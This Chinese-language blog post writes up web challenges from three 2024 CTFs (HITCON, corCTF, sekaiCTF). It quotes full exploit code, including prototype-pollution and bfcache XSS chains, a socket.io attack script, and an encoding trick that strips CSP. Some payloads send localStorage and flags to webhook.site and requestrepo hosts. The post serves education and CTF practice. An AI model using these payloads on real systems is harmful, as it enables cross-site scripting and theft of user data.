---
来源: https://blog.huli.tw/2024/09/23/hitconctf-corctf-sekaictf-2024-writeup/
类型: html
获取日期: 2026-06-29
---

HITCON CTF & corCTF & sekaiCTF 2024 筆記 - Huli's blog


window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-1393J2EVCZ');


if (localStorage.getItem('dark-mode')) {
if (localStorage.getItem('dark-mode') === 'true') {
document.body.classList.add('dark-mode')
}
} else {
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
document.body.classList.add('dark-mode')
}
}


[Huli's blog](/)

[文章列表](/archives)
[隨意聊](/notes)
[分類](/categories)
[關於我](/about)

目錄

[1  **HITCON CTF 2024**](#hitcon-ctf-2024)
[1.1  Private Browsing+](#private-browsing)


---

[2  **corCTF 2024**](#corctf-2024)
[2.1  web/corctf-challenge-dev - 17 solves](#webx2fcorctf-challenge-dev-17-solves)
[2.2  web/iframe-note - 2 solves](#webx2fiframe-note-2-solves)
[2.3  corchat x - 1 solve](#corchat-x-1-solve)
[2.4  web/repayment-pal - 0 solve](#webx2frepayment-pal-0-solve)


---

[3  **sekaiCTF 2024**](#sekaictf-2024)
[3.1  htmlsandbox (4 solves)](#htmlsandbox-4-solves)


[English](/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。

# HITCON CTF & corCTF & sekaiCTF 2024 筆記

2024年9月23日


[Security](/categories/Security/)

久違的筆記，想寫很久了但一直拖延，像是 CTF 這種東西的 writeup 其實速度滿重要的，因為賽後討論大部分都在 Discord 裡面發生，時間久了訊息比較難找，而且很有可能忘記，要趕快寫成 writeup 才能把那些實用的資訊記錄下來。

這篇一次帶來三個 CTF 的 writeup，有些我沒有打，只是純粹看著別人的筆記重新記一遍而已。

關鍵字列表：

1. bfcache
2. response splitting
3. Service-Worker-Allowed
4. gunicorn script\_name
5. socket.io disconnect
6. socket.io JSONP CSP bypass
7. performance API
8. streaming HTML parsing
9. content-type ISO-2022-JP

## HITCON CTF 2024

### Private Browsing+

這題基本上是個 proxy，會把 `/~huli/` 底下的東西 proxy 到其他網站，而 response 會根據 header 不同而有所不同：

```
if (
    req.headers['sec-fetch-mode'] &&
    req.headers['sec-fetch-mode'] !== 'navigate' &&
    req.headers['sec-fetch-site'] === 'same-origin'
) {
    req.url = chunks.slice(2).join('/')
    proxy.handler(req, res)
} else {
    res.writeHead(200, { ...DEFAULT_HEADERS, 'content-type': 'text/html' })
    res.end(VIEWER_HTML.replace('SITEB64', btoa(proxy.site)))
}
```

如果是 navigate 的話，就會回傳 VIEWER\_HTML，在這裡面會做各種 sanitize，所以沒辦法 XSS。

繞過方式是利用 bfcache，在 [SECCON CTF 2022 Quals - spanote](https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote) 有出現過，簡單來講呢，我們先造訪 target.html，此時的 response 會是 VIEWER\_HTML，而在 VIEWER\_HTML 內會執行 `fetch('target.html')` 去把內容抓回來，這時候 response 就會被放在 cache 中

再來，我們把同個分頁導到自己的 origin，接著執行 `history.go(-1)`，把 URL 導回去 `target.html`，此時因為 bfcache 的關係，就會載入用 `fetch('target.html')` 所抓取的 HTML，繞過了原本的限制，可以載入任意 HTML。

但下一個問題是 CSP：`default-src 'self';`，因此 script 只能載入 same-origin 的，但 proxy 那邊有限制：

```
if (
    res.headers['content-type'].toLowerCase().includes('script') ||
    req.headers['sec-fetch-dest'] === 'script'
) {
    res.headers['content-length'] = '0'
    delete res.headers['transfer-encoding']
}
```

如果 content type 包含 script，直接把 content-length 變成 0，因此沒辦法載入 script。

這時候就要用到 response splitting 了，因為 proxy 那邊會直接把收到的 response pipe 出去，因此可以構造出這樣的流程：

1. 在 browser 那端發出第一個請求，就叫請求 A 吧
2. 在請求 A 的 response 中先輸出 `expect: '100-continue'` header，讓 proxy server 那邊把 header 輸出，此時對瀏覽器來說第一個請求已經結束，拿到了 response，
3. browser 發出第二個請求 B，延用同一個 connection
4. 這時輸出請求 B 的 response（但是對 proxy 來說還是請求 A 的 response），繞過 content type 的限制，因為 proxy 認為這是 response content

簡單來講就是類似 request smuggling 那樣，不過是反過來做。

這邊的細節有兩個：

1. 透過 Chrome 對同一個 domain 有 6 個 concurrent 的限制，確保其中兩個請求會用到同一個 connection
2. Node.js server 在收到 `Expect: 100-continue` 的時候，會先 flush，這一步是必要的，要繞過 Chrome 的限制

可以載入 JS 之後，就再用一樣的方法載入 service worker，並且用 `Service-Worker-Allowed: /` header 來擴大 scope，可以註冊到整個 origin。

更多細節可以參考 maple 的 writeup: <https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202024/Private%20Browsing%2B>

## corCTF 2024

### web/corctf-challenge-dev - 17 solves

Author: drakon

一個跟 Chrome extension 有關的題目，但作者已經寫得很詳細了，就不多寫了：[corCTF 2024 - corctf-challenge-dev](https://cor.team/posts/corctf-2024-corctf-challenge-dev/)

### web/iframe-note - 2 solves

Author: sterllic

這題的核心程式碼是底下這段：

```
<iframe id="iframe"></iframe>
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
<script src="{{ url_for('static', filename='can.min.js') }}"></script>
<script>
  window.onload = () => {
    if (["__proto__", "constructor", "prototype"].some(d => location.search.includes(d))) {
      return;
    }

    const qs = can.deparam(location.search.slice(1));

    if (!qs.id) {
      alert("no id provided");
      location.href = "/";
    }

    axios.get(`/iframe/${encodeURIComponent(qs.id)}`)
    .then(res => {
      if (res.data.error) {
        alert("no iframe found with that id!");
        return;
      }

      if (!res.data.url.toLowerCase().startsWith("http")) {
        alert("invalid url");
        return;
      }

      document.querySelector("#name").textContent = res.data.name;
      document.querySelector("#iframe").src = res.data.url;
      document.querySelector("#iframe").style = res.data.style;
    });
  }
</script>
```

後端用 Flask + gunicorn 渲染出上面這個網頁。

can.js 有個 prototype pollution 的漏洞，就算有做了檢查還是可以用 URL encode 繞過，但問題是有了 pollution 之後可以幹嘛。

前端乍看之下就是 `document.querySelector("#iframe").src = res.data.url` 這段最可疑了，但是這邊需要能控制 server 的 response，但是 server 那邊有做檢查，因此 data.url 只能是 http 開頭。

最後的解法是跟 axios、bfcache 還有 gunicorn 的行為有關，gunicorn 會根據 header 裡面的 `script_name` 來決定最後的 path，以 [Gunicorn’s handling of PATH\_INFO and SCRIPT\_NAME can lead to security issues when placed behind a proxy #2650](https://github.com/benoitc/gunicorn/issues/2650) 裡面給的範例來說：

```
requests.get(URL+'/REMOVED/admin/something/bad',
             headers={'script_name':'REMOVED/'})
```

如果前面有個 nginx 把所有 /admin 開頭的請求都擋掉，這時我們可以發送一個 /REMOVED/admin 的請求再搭配 script\_name 是 REMOVED/，nginx 會通過，但是到 gunicorn 的時候就會把 path 解析為 /admin，直接繞過了前面的 nginx 檢查。

而這題會用到這個行為的地方在：

```
<script src="{{ url_for('static', filename='axios.min.js') }}"></script>
```

如果你執行 `curl https://iframe-note.be.ax////example.com/view -H "SCRIPT_NAME: //example.com`，那最後 path 是 /view，但是 base URL 會變，渲染的結果是：

```
<script src="//example.com/static/axios.min.js"></script>
```

就能夠直接控制頁面上的 src。

作者可能懶得弄一個 instance 來 host payload，因此直接用了 data URI，把 script 變成 `<script src="data:text/javascript,{XSS}">`

因為要達成這個結果需要在請求中傳送 header，所以需要用到 bfcache，流程是：

1. 先造訪最後需要的 URL
2. 跳轉到 view 頁面，利用 prototype pollution 讓 fetch 送出有 header 的請求
3. 回到上一頁，此時因為 bfcache，會沿用剛剛 fetch 的 response，就是有 header 的版本
4. XSS

作者的 exploit：

```
<body>
  <script>
    // const BASE_URL = "http://localhost:3000";
    const BASE_URL = "https://iframe-note.be.ax";

    const HOOK_URL = "https://webhook.site/xxxxx";

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    const main = async () => {
      const dataUrl = `data:text/javascript,navigator.sendBeacon('${HOOK_URL}',JSON.stringify(localStorage))`;

      const win = open(`${BASE_URL}/${dataUrl}/iframe/view`);
      await sleep(1000);

      win.location = `${BASE_URL}/view?id=view&__%70roto__[headers][SCRIPT_NAME]=${dataUrl}/iframe&__%70roto__[baseURL]=/${dataUrl}/`;
      await sleep(1000);

      win.location = `${location.origin}/back.html?n=2`;
    };
    main();
  </script>
</body>
```

```
<script>
  const n = parseInt(new URLSearchParams(location.search).get("n"));
  history.go(-n);
</script>
```

### corchat x - 1 solve

Author: larry

跟 socket.io 有關的題目，重點看起來是三個：

1. 可以送出 disconnect 事件但是沒有 disconnect
2. sokcet.io 的 JSONP 可以拿來 bypass CSP
3. 用 performance API 列出曾經載入過的資源

底下附上 Discord 中 EhhThing 貼的 exploit：

```
import socketio
import requests
import time
import json

base_url = 'https://corchat-x-a6e1f8c45d3ca520.be.ax'

def create_sid():
    session = requests.Session()
    login = session.post(f'{base_url}/', data = {}, allow_redirects=False)
    assert login.status_code == 302, login.status_code

    res = session.get(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'bingus',
    })
    assert res.status_code == 200, res.status_code

    socket_session = json.loads(res.text[1:])
    print('fake session', socket_session)

    res = session.post(f'{base_url}/socket.io/', params = {
        'EIO': 4,
        'transport': 'polling',
        't': 'P3qHGUZ',
        'sid': socket_session['sid'],
    }, data = b'40')
    assert res.status_code == 200, res.status_code

    return socket_session['sid']

bot_session = requests.Session()
login = bot_session.post(f'{base_url}/', data = {
    'name': 'FizzBuzz101',
}, allow_redirects=False)
assert login.status_code == 302, login.status_code

sio = socketio.Client(http_session=bot_session)
ready = False

@sio.event
def connect():
    global ready

    print('connected!')

    # fake disconnect event so that the bot can connect as well
    sio.emit('disconnect')
    time.sleep(1)
    ready = True
    print('ready for bot!')

@sio.event
def message(data):
    global ready

    if not ready:
        return

    print('message', data)
    if data['content'] == 'FizzBuzz101 joined.': # XSS bot opened the chat
        first_sid = create_sid()
        js_payload = """
(window.exfil = data => window.top.opener.top.socket.emit('message', data))
(window.observer = new parent.PerformanceObserver((list) => { list.getEntries().forEach((entry) => { window.exfil('Flag: ' + decodeURIComponent(entry.name.split('/').pop())); }); }))
(window.observer.observe({ type: 'resource', buffered: true }))
""".strip().replace('\n', ',')
        sio.emit('message', '\\"+'+js_payload+');//')

        second_sid = create_sid()
        jsonp_url = f'{base_url}/socket.io/?EIO=4&transport=polling&t=bingus&sid={second_sid}&j=0'
        js_payload = """
(window.secret=window.open('','secret'))
(window.a=window.top.document.getElementById('xss').cloneNode())
(window.a.srcdoc=window.a.srcdoc.replace('%s','%s'))
(window.secret.document.body.appendChild(window.a))
""".strip().replace('\n', ',') % (second_sid, first_sid)

        sio.emit('message', '\\"+'+js_payload+');//')

        xss_payload = """
<a id=&quot;___eio&quot;></a>
<a id=&quot;___eio&quot;></a>
<script src=&quot;%s&quot;></script>
""" % jsonp_url
        chat_message = '<iframe id="xss" srcdoc="%s"></iframe>' % xss_payload.strip()
        assert len(chat_message) < 400, 'chat message too long, time to write better payload'
        sio.emit('message', chat_message)

sio.connect(base_url)
sio.wait()
```

### web/repayment-pal - 0 solve

Author: strellic

跟 Next.js 有關的題目，賽中沒有人解開，賽後也沒有公佈解法。

底下是公佈過的提示：

1. +24 hour hint drop: hm, why is dev mode enabled?
2. +36 hour hint drop: try to find a way to get html injection!
3. Post-CTF hint drop: An earlier version of the challenge had an extra check in the middleware, requiring all API requests to have the header Sec-Fetch-Dest: empty

## sekaiCTF 2024

### htmlsandbox (4 solves)

Author: arxenix

題目連結：<https://github.com/project-sekai-ctf/sekaictf-2024/tree/main/web/htmlsandbox>

這題可以讓你上傳 HTML，但是把能擋的全部都擋掉了，並且會檢查 head 裡面有沒有：`<meta http-equiv="Content-Security-Policy" content="default-src 'none'">`，來確保不能執行 JavaScript 程式碼。

而解法是檢查的時候是把 HTML 變成 `data:text/html` 來檢查，但實際造訪的時候就是一般的網頁，而這兩者的 parsing 規則不一樣，當檔案很大的時候，前者會全部一次 parsing，但後者會一個 chunk 一個 chunk 做，而且每個 chunk 的 encoding 可以不同。

細節可以看作者的 writeup：[SekaiCTF’24 htmlsandbox - Author Writeup](https://blog.ankursundara.com/htmlsandbox-writeup/) 或是這篇 [0xalessandro 的 writeup](https://0xalessandro.github.io/posts/sekai/)，他最後的 exploit 長這樣：

```
import requests

#0xAlessandro was here
c1 = b'''<html><head>
    <!-- \x1b$@ aa -->''' + b'''
<meta http-equiv="Content-Security-Policy" content="default-src 'none'">
\x1b(B <!-- test -->
''' + b"\x1b(B<!-- " + b"A"*64000 + b"-->"+ b"<!--"+b"A"*100+b"-->"

c2 = b'''
    <meta charset="utf-8">
    </head>
    <body>
    <svg><animate onbegin="fetch(`https://s9cs3dwb.requestrepo.com?c=${localStorage.getItem('flag')}`)" attributeName="x" dur="1s">
    </body>
</html>'''

html = c1 + c2
with open('test.html', "wb") as f:
   f.write(html)

r = requests.post('https://htmlsandbox.chals.sekai.team/upload', data={'html': html})
print(r.text)
```

在使用 data URI 的時候，整個 HTML 就是被當作 utf-8 來解析，沒什麼問題。

但被當作網頁來造訪的時候，由於分成了兩個 chunk，而 `<meta charset="utf-8">` 出現在第二個 chunk，因此第一個 chunk 會用 `JIS X 0208 1983` 來解析，CSP 就變成了一堆亂碼，被拿掉了。

讀到第二個 chunk 時看到 meta，就切換成 UTF-8，照常載入，如此一來就可以擺脫 CSP，達成 XSS。

這個 encoding 利用的細節可以參考：[Encoding Differentials: Why Charset Matters](https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/)。

[#Security](/tags/Security/)

[navigator.sendBeacon 的 64KiB 限制與底層實作](/2025/01/06/navigator-sendbeacon-64kib-and-source-code/)

[idekCTF 2024 筆記之 iframe 高級魔法](/2024/09/07/idek-ctf-2024-iframe/)

### 評論

© 2026 Huli 
Powered by [Hexo](http://hexo.io/) & [Minos](https://github.com/ppoffice/hexo-theme-minos)

[GitHub](https://github.com/ppoffice/hexo-theme-minos "GitHub")

繁體中文

[English](/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)


(function ($) {
$(document).ready(function () {
if (typeof($.fn.lightGallery) === 'function') {
$('.article.gallery').lightGallery({ selector: '.gallery-item' });
}
});
})(jQuery);


.hljs {
position: relative;
}
.hljs .clipboard-btn {
float: right;
color: #9a9a9a;
background: none;
border: none;
cursor: pointer;
}
.hljs .clipboard-btn:hover {
color: #8a8a8a;
}
.hljs > .clipboard-btn {
display: none;
position: absolute;
right: 4px;
top: 4px;
}
.hljs:hover > .clipboard-btn {
display: inline;
}
.hljs > figcaption > .clipboard-btn {
margin-right: 4px;
}

$(document).ready(function () {
$('figure.hljs').each(function(i, figure) {
var codeId = 'code-' + i;
var code = figure.querySelector('.code');
var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
code.id = codeId;
copyButton.addClass('clipboard-btn');
copyButton.attr('data-clipboard-target-id', codeId);
var figcaption = figure.querySelector('figcaption');
if (figcaption) {
figcaption.append(copyButton[0]);
} else {
figure.prepend(copyButton[0]);
}
})
var clipboard = new ClipboardJS('.clipboard-btn', {
target: function(trigger) {
return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
}
});
clipboard.on('success', function(e) {
e.clearSelection();
})
})